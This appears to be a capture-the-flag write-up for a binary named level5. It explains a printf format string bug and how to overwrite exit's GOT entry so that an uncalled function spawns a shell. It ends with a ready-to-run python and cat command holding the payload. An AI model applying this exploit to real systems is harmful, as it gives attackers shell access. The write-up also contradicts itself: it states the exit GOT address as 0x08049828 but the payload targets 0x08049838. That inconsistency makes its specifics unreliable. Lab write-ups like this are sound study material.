# LEVEL5

## EXPLANATIONS
### BINARY BEHAVIOR

- 3 function main, n, and o. main call n but o is never called  
    - \<n\>  
    -->n gets the stdin input and put it in buf  
    --> then printf(buf) (format string exploit)  
    --> exit  
    - \<o\>  
    -->call system("bin/sh")

### EXPLOI STRATEGY
- same as before, format string exploit  
    - in previous levels, overwriting a given address with a given value would lead to a win.  
    - This time, we only see a o function, called nowhere, that makes us win.  
    - Somehow we need to write an format string exploit that will call this function.  
    - There's a call to exit so we cannot just override sEIP.  
    - Looking to override exit, we saw function name was @plt and then @got.plt.  
    - Some reasearches on this quickly led us to know we could change addresses of the global offset table.  

- exit GOT address : 0x08049828
- address of \<o\> : 134513824 + 4 = 0x080484A4

### RUN COMMAND
```
python -c "print('\x08\x04\x98\x38'[::-1] + '%134513824x' + '%4\$n')" > /tmp/exploit_string
cat /tmp/exploit_string - | /home/user/level5/level5
```